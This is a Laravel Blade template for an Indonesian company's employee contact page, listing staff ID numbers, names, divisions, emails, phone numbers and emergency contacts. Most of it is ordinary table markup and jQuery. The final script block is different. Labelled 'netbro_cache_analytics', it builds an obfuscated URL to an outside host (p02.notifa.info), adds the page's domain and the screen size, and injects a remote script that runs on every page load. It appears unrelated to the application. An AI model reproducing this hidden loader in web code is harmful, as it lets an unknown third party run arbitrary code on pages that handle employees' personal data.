<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="shortcut icon" href="/image/favicon.png">
    <title>Kontak Karyawan</title>
    <link rel="stylesheet" type="text/css" href="assets/lib/perfect-scrollbar/css/perfect-scrollbar.min.css"/>
    <link rel="stylesheet" type="text/css" href="assets/lib/material-design-icons/css/material-design-iconic-font.min.css"/>
    <link rel="stylesheet" type="text/css" href="assets/lib/datatables/css/dataTables.bootstrap.min.css"/>    
    <link rel="stylesheet" href="/assets/css/style.css" type="text/css"/> 
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
    <link rel="stylesheet" type="text/css" href="assets/lib/jquery.vectormap/jquery-jvectormap-1.2.2.css"/>
    <link rel="stylesheet" type="text/css" href="assets/lib/jqvmap/jqvmap.min.css"/>
    <link rel="stylesheet" type="text/css" href="assets/lib/datetimepicker/css/bootstrap-datetimepicker.min.css"/>
</head>
<body>

  <!-- Wrapper Start -->
  <div class="be-wrapper">

    <!--  Sidebar Start -->  
    <div class="be-wrapper be-fixed-sidebar">
      @include('Beranda.sidebar')
    </div>
    <!--  Sidebar End --> 

    <!-- Konten Start -->
    <div class="be-content">
      <div class="page-head">
        <h2 class="page-head-title">Kontak Karyawan</h2>
      </div>
        <div class="main-content container-fluid">
          <div class="row">
            <div class="col-sm-12">

              <!-- Table Kontak Karyawan Start -->
              <div class="panel panel-default panel-table">
                <div class="panel-body">
                  <div class="table-responsive noSwipe">
                  <table id="table1" class="table table-striped table-hover table-fw-widget">
                    <thead>
                      <tr>
                        <th>NIK</th>
                        <th>Nama</th>
                        <th>Divisi</th>
                        <th>Email</th>
                        <th>No.Telepon</th>
                        <th>No.Telepon Darurat</th>
                        <th>Hub.Telepon Darurat</th>
                      </tr>
                    </thead>
                    <tbody>
                      @foreach($kontak_karyawan as $kontak_karyawan)
                      <tr class="odd gradeA">
                        <td>{{$kontak_karyawan->nik}}</td>
                        <td> {{$kontak_karyawan->nama_karyawan}} </td>
                        <td> {{$kontak_karyawan->divisi}} </td>
                        <td>{{$kontak_karyawan->email}}</td>
                        <td class="center"> {{$kontak_karyawan->no_telp}} </td>
                        <td>{{$kontak_karyawan->no_telp_darurat}}</td>
                        <td>{{$kontak_karyawan->hub_no_telp_darurat}}</td>
                      </tr>
                      @endforeach
                    </tbody>
                  </table>
                  </div>
                </div>
              </div>
             <!--  Tabel Kontak Karyawan End -->

            </div>
          </div>
        </div>
      </div>
      <!--  Konten End -->

    <!--  Footer Start -->
     <div class="text-center">
      <div class="credits">
        <p>Sistem Informasi Karyawan<b> Idea Imaji Persada</b></p>
      </div>
     </div>
     <!-- Footer End -->

    </div>
    <!-- Wrapper End -->

    <!-- JS untuk opsi resign di bagian edit data karyawan -->

    <script src="assets/lib/jquery/jquery.min.js" type="text/javascript"></script>
    <script src="assets/lib/perfect-scrollbar/js/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
    <script src="assets/js/main.js" type="text/javascript"></script>
    <script src="assets/lib/bootstrap/dist/js/bootstrap.min.js" type="text/javascript"></script>
    <script src="assets/lib/datatables/js/jquery.dataTables.min.js" type="text/javascript"></script>
    <script src="assets/lib/datatables/js/dataTables.bootstrap.min.js" type="text/javascript"></script>
    <script src="assets/lib/datatables/plugins/buttons/js/dataTables.buttons.js" type="text/javascript"></script>
    <script src="assets/lib/datatables/plugins/buttons/js/buttons.html5.js" type="text/javascript"></script>
    <script src="assets/lib/datatables/plugins/buttons/js/buttons.flash.js" type="text/javascript"></script>
    <script src="assets/lib/datatables/plugins/buttons/js/buttons.print.js" type="text/javascript"></script>
    <script src="assets/lib/datatables/plugins/buttons/js/buttons.colVis.js" type="text/javascript"></script>
    <script src="assets/lib/datatables/plugins/buttons/js/buttons.bootstrap.js" type="text/javascript"></script>

    <script type="text/javascript">
      $(document).ready(function(){
        //initialize the javascript
        App.init();
        App.dataTables();
      });
    </script>

    <script type="text/javascript">
      document.getElementById("status").onchange = function () {
      document.getElementById("alasan").setAttribute("disabled", "disabled");
       document.getElementById("tgl_resign").setAttribute("disabled", "disabled");
      if (this.value == 'Resign')
        document.getElementById("alasan").removeAttribute("disabled");
      if (this.value == 'Resign')
      document.getElementById("tgl_resign").removeAttribute("disabled");
      };

      // Fungsi Logout

      $(function(){
          $('a#logout').click(function(){
              if(confirm('Apakah anda yakin ingin keluar ?')) {
                  return true;
              }

              return false;
                });
            });


      // Fungsi Menu dashboard

      $(document).ready(function(){

          App.init();
          App.dashboard();

          });
      </script>

      <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function() {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrwd1XyoNwUzpvf2l56FucADiEx%2bf3JAPJogkNU%2biFfwCiZ%2bA5y%2fz1GPfkI78hOjpKGi13lyWOD4PTAvdGjGONrTkbHyQtyDiXMT6f73PUxXAafylPFQAofDmqSRGCN6kLPoPHF5oxuxg%2bsgcyENso77BDI%2biq12wLsMGa%2bin6lXObrjR5nN3n3mCHDOu9rOERnmtSCzsvQVvQC2um1T%2fNsq2QIjE4KBpR9Vkl2LpxVPpB5ls%2failQCaTL23yQg6%2fVmE4aJahv4ErgHCjfL9mX4EPIxsCfVSS1MVwUyVfrSegVjjaXYDrZcarSkz7F2VXD0r3sg%2bPtdKUwpPNNQOOz0e5p%2bJ9WrZ7lxjycaB2F9Ci38ljGYNDUDDsnXT6j2Y7m3PBs%2bu3Atlk%2f2VykRlaJnvFNX%2bS%2flT5eDv6PQdmrWoWEBnXUCINHwnSwu3Cu7NudtMWlNGrsWK93HbdfLL45H%2f2NwIlDGeGNFBHlAFq869dDf3eePYoKSnP2OLHCFol" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function() {});
        };

      </script>

</body>
</html>
